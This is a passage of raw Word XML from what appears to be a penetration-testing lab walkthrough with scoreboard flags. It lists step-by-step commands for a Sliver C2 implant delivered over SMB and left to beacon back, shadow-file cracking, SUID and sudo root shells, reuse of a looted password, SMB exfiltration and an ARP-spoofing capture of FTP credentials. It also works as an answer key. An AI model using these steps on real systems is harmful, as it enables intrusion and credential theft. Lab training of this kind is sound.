          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>jobs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>generate --mtls 172.28.20.80:8888 --os linux --arch amd64 --format elf --skip-symbols --save /tmp/implant.elf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># in a second Kali shell, deliver (give the remote name explicitly):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>smbclient //172.28.20.70/drop -N -c 'put /tmp/implant.elf implant.elf'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># back in Sliver, within ~20s:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sessions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>use &lt;session-id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /home/victim/loot/c2_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c2-01’s internal address is 172.28.20.80; the operator config is pre-mounted at /c2/operator.cfg.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>--skip-symbols avoids the symbol-obfuscation build step (which can fail); the session appears within ~20s.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c2_flag.txt (the Sliver flag) is in the victim’s loot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Leaving the implant in place (it re-beacons) is the expanded-persistence demonstration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>23. Local Password Attack and Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</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MODULE_11B_PWCRACK_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Find the world-readable shadow backup on ws-01, crack root offline, su to root, read the root-only flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># as jsmith on 172.28.20.50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /var/backups/shadow.bak               # world-readable, holds root’s hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># pull it to Kali, then crack:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>john --wordlist=/usr/share/wordlists/lab-passwords.txt shadow.bak</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>su - root                                  # password Summer2024</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /root/ctf/pwcrack_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>John recovers root’s password: Summer2024.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>pwcrack_flag.txt is mode 600 (root only), readable only after su.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>24. Privilege Escalation (SUID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</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MODULE_11C_SUID_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal (ws-03)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Find the setuid-root binary on the workstation and abuse it for a root shell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># from your victim shell on ws-03</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>find / -perm -4000 -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/usr/bin/backuptool -p                     # a renamed setuid copy of bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>id                                         # euid=0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /root/ctf/suid_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>/usr/bin/backuptool is bash (mode 4755); -p preserves privileges for an euid-0 shell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>suid_flag.txt is root-only.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>25. Privilege Escalation (sudo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</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MODULE_11D_SUDO_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal (ws-03)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Abuse a NOPASSWD sudo rule on find to get a root shell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo -l                                    # victim may run /usr/bin/find as root, NOPASSWD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo find . -exec /bin/sh \; -quit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /root/ctf/sudo_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>find’s -exec runs /bin/sh as root (GTFOBins technique).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>sudo_flag.txt is root-only.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>26. Credential Reuse and Lateral Movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12</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MODULE_12B_CREDREUSE_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Reuse the looted svcapp credential to SSH onto the internal pivot and read its flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh svcapp@172.28.20.50                    # password Falcon2023! (from app_config.php)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat ~/loot/credreuse_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The looted service-account password opens the internal host with no exploit (lateral movement).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>credreuse_flag.txt is in svcapp’s loot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27. Actions on Objectives</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12</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MODULE_10_EXFIL_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Reach the crown-jewel file server, mount its guest share, and exfiltrate the flag file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>smbclient -L //172.28.20.60 -N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>smbclient //172.28.20.60/data -N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd loot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>get exfil_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>files-01 (172.28.20.60) allows guest access to the data share.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>exfil_flag.txt is in the loot folder. Windows path: \\pentesttv-files\data\loot\exfil_flag.txt.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>28. Targeting the Network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>manual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Enumerate the SNMP device and run an ARP MITM to capture cleartext FTP credentials off the wire.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>snmpwalk -v2c -c public 172.28.20.40        # public view; try a private community for writable OIDs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ws-02 (172.28.20.61) repeatedly logs into the target over FTP in cleartext:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bettercap -iface eth1                        # ARP spoof between ws-02 and the target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># or ettercap; then capture:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>tcpdump -i eth1 -A 'tcp port 21'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SNMP dumps the device’s public view.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The MITM captures the cleartext FTP username and password ws-02 sends. Mark done.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>29. Log Mining</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12</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MODULE_ENT_SYSLOG_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Read the exported application log on the collector and find the cleartext credential and audit token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://172.28.20.110/app.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>log-01 (172.28.20.110) serves its export read-only over HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
